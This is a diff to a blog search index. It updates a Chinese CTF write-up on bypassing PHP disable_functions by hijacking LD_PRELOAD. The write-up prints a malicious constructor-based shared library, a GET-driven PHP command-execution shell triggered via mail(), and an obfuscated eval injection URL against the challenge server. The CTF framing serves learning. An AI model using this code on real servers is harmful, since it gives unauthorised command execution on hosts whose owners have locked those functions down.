@@ -38,7 +38,7 @@
         <category>CTF</category>
       </categories>
       <tags>
-        <tag>php</tag>
+        <tag>PHP</tag>
         <tag>弱类型</tag>
       </tags>
   </entry>
@@ -74,7 +74,7 @@
 <p>直接在虚拟终端中执行readflag命令</p>
 <p><img src="/2019/10/30/bypass-disable-functions/image-20191030152803007.png" alt="image-20191030152803007"></p>
 <p>发现命令都无法执行，查看phpinfo()；估计是调用系统命令的函数被禁用了</p>
-<p> <img src="https://asscreed.github.io/2019/10/18/%E7%AC%AC%E5%8D%81%E5%B1%8A%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98Write-up/1571499768310.png" alt="1571499768310"> </p>
+<p> <img src="/2019/10/30/bypass-disable-functions/1571499768310.png" alt="1571499768310"> </p>
 <h3 id="bypass-disable-functions"><a href="#bypass-disable-functions" class="headerlink" title="bypass_disable_functions"></a>bypass_disable_functions</h3><p>一般而言，利用漏洞控制 web 启动新进程 a.bin，a.bin 内部调用系统函数 b()，b()  位于系统共享对象 c.so 中，所以系统为该进程加载共 c.so，想法在 c.so 前优先加载可控的 c_evil.so，c_evil.so  内含与 b() 同名的恶意函数，由于 c_evil.so 优先级较高，所以，a.bin 将调用到 c_evil.so 内 b() 而非系统的  c.so 内 b()，同时，c_evil.so 可控，达到执行恶意代码的目的。基于这一思路，常见突破 disable_functions  限制执行操作系统命令的方式为：</p>
 <ul>
 <li>编写一个原型为 uid_t getuid(void); 的 C 函数，内部执行攻击者指定的代码，并编译成共享对象 getuid_shadow.so；</li>
@@ -104,19 +104,20 @@
 <p>如</p>
 <figure class="highlight abnf"><table><tr><td class="code"><pre><span class="line">putenv(<span class="string">"LD_PRELOAD=/tmp/evil.so"</span>)<span class="comment">;</span></span><br></pre></td></tr></table></figure>
 
-<h4 id="劫持系统函数绕过disable-functions"><a href="#劫持系统函数绕过disable-functions" class="headerlink" title="劫持系统函数绕过disable_functions"></a>劫持系统函数绕过disable_functions</h4><p>把readflag下载到本地 IDA反编译</p>
+<h4 id="劫持共享库绕过disable-functions"><a href="#劫持共享库绕过disable-functions" class="headerlink" title="劫持共享库绕过disable_functions"></a>劫持共享库绕过disable_functions</h4><p>把readflag下载到本地 IDA反编译</p>
 <p> <img src="/2019/10/30/bypass-disable-functions/1571502795907.png" alt="1571502795907"></p>
 <p>bypass.c文件：</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">char</span>** environ; <span class="comment">//获取环境变量</span></span><br><span class="line"></span><br><span class="line">__attribute__ ((__constructor__)) <span class="function"><span class="keyword">void</span> <span class="title">preload</span> <span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// get command line options and arg</span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span>* cmdline = getenv(<span class="string">"EVIL_CMDLINE"</span>);</span><br><span class="line">    <span class="comment">//获取EVIL_CMDLINE的值</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// unset environment variable LD_PRELOAD.</span></span><br><span class="line">    <span class="comment">// unsetenv("LD_PRELOAD") no effect on some </span></span><br><span class="line">    <span class="comment">// distribution (e.g., centos), I need crafty trick.</span></span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="comment">//从环境变量中遍历“LD_PRELOAD”的位置，并将其值设为NULL</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; environ[i]; ++i) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">strstr</span>(environ[i], <span class="string">"LD_PRELOAD"</span>)) &#123;</span><br><span class="line">                    environ[i][<span class="number">0</span>] = <span class="string">'\0'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// executive command</span></span><br><span class="line">    system(cmdline);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">char</span>** environ; <span class="comment">//获取环境变量</span></span><br><span class="line"></span><br><span class="line">__attribute__ ((__constructor__)) <span class="function"><span class="keyword">void</span> <span class="title">preload</span> <span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// get command line options and arg</span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span>* cmdline = getenv(<span class="string">"EVIL_CMDLINE"</span>);</span><br><span class="line">    <span class="comment">//获取EVIL_CMDLINE的值</span></span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="comment">//从环境变量中遍历“LD_PRELOAD”的位置，并将其值设为NULL。</span></span><br><span class="line">    <span class="comment">//从而使下面的system()正常执行。</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; environ[i]; ++i) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">strstr</span>(environ[i], <span class="string">"LD_PRELOAD"</span>)) &#123;</span><br><span class="line">                    environ[i][<span class="number">0</span>] = <span class="string">'\0'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 执行命令</span></span><br><span class="line">    system(cmdline);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gcc -shared -fPIC bypass.c -o bypass_x64.so</span><br></pre></td></tr></table></figure>
 
 <p>bypass.php:</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;p&gt; &lt;b&gt;example&lt;/b&gt;: http://site.com/bypass_disablefunc.php?cmd=pwd&amp;outpath=/tmp/xx&amp;sopath=/var/www/bypass_disablefunc_x64.so &lt;/p&gt;"</span>;</span><br><span class="line">    $cmd = $_GET[<span class="string">"cmd"</span>];</span><br><span class="line">    $out_path = $_GET[<span class="string">"outpath"</span>];</span><br><span class="line">    $evil_cmdline = $cmd . <span class="string">" &gt; "</span> . $out_path . <span class="string">" 2&gt;&amp;1"</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;p&gt; &lt;b&gt;cmdline&lt;/b&gt;: "</span> . $evil_cmdline . <span class="string">"&lt;/p&gt;"</span>;</span><br><span class="line">    putenv(<span class="string">"EVIL_CMDLINE="</span> . $evil_cmdline);</span><br><span class="line">    $so_path = $_GET[<span class="string">"sopath"</span>];</span><br><span class="line">    putenv(<span class="string">"LD_PRELOAD="</span> . $so_path);</span><br><span class="line">    mail(<span class="string">""</span>, <span class="string">""</span>, <span class="string">""</span>, <span class="string">""</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;p&gt; &lt;b&gt;output&lt;/b&gt;: &lt;br /&gt;"</span> . nl2br(file_get_contents($out_path)) . <span class="string">"&lt;/p&gt;"</span>; </span><br><span class="line">    unlink($out_path);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;p&gt; &lt;b&gt;example&lt;/b&gt;: http://site.com/bypass_disablefunc.php?cmd=pwd&amp;outpath=/tmp/xx&amp;sopath=/var/www/bypass_disablefunc_x64.so &lt;/p&gt;"</span>;</span><br><span class="line">    $cmd = $_GET[<span class="string">"cmd"</span>];</span><br><span class="line">    $out_path = $_GET[<span class="string">"outpath"</span>];</span><br><span class="line">    $evil_cmdline = $cmd . <span class="string">" &gt; "</span> . $out_path . <span class="string">" 2&gt;&amp;1"</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;p&gt; &lt;b&gt;cmdline&lt;/b&gt;: "</span> . $evil_cmdline . <span class="string">"&lt;/p&gt;"</span>;</span><br><span class="line">    putenv(<span class="string">"EVIL_CMDLINE="</span> . $evil_cmdline); <span class="comment">//设置EVIL_CMDLINE环境变量</span></span><br><span class="line">    $so_path = $_GET[<span class="string">"sopath"</span>];</span><br><span class="line">    putenv(<span class="string">"LD_PRELOAD="</span> . $so_path);  <span class="comment">//加载恶意动态库</span></span><br><span class="line">    mail(<span class="string">""</span>, <span class="string">""</span>, <span class="string">""</span>, <span class="string">""</span>);  <span class="comment">//利用mail函数触发恶意函数，跳转至__attribute__ ((__constructor__))修饰的函数。</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;p&gt; &lt;b&gt;output&lt;/b&gt;: &lt;br /&gt;"</span> . nl2br(file_get_contents($out_path)) . <span class="string">"&lt;/p&gt;"</span>; </span><br><span class="line">    unlink($out_path);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
+<p>最终payload为</p>
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//114.116.44.23:40001/?code=$_=%22`&#123;&#123;&#123;%22^%22?%3C%3E/%22;$&#123;$_&#125;[_]($&#123;$_&#125;[__]);&amp;_=assert&amp;__=eval($_GET[a])&amp;a=include(%27/tmp/bypass.php%27);&amp;cmd=./../../../readflag&amp;outpath=/tmp/123.txt&amp;sopath=/tmp/bypass_x64.so</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="/2019/10/30/bypass-disable-functions/image-20191030182559041.png" alt="image-20191030182559041"></p>
+<p><img src="/2019/10/30/bypass-disable-functions/image-20191103123740141.png" alt="image-20191103123740141"></p>
 <p><a href="https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD" target="_blank" rel="noopener">参考文章1</a></p>
 <p><a href="https://www.cnblogs.com/leixiao-/p/10612798.html" target="_blank" rel="noopener">参考文章2</a></p>
 ]]></content>
@@ -124,9 +125,8 @@
         <category>CTF</category>
       </categories>
       <tags>
-        <tag>bypass</tag>
-        <tag>disable_functions</tag>
-        <tag>putenv()</tag>
+        <tag>PHP</tag>
+        <tag>BYPASS_DISbypass_disable_functions</tag>
       </tags>
   </entry>
   <entry>
@@ -369,9 +369,8 @@
         <category>CTF</category>
       </categories>
       <tags>
-        <tag>WEB</tag>
-        <tag>MISC</tag>
-        <tag>DISABLE_FUNCTIONS</tag>
+        <tag>PHP</tag>
+        <tag>WP</tag>
       </tags>
   </entry>
 </search>
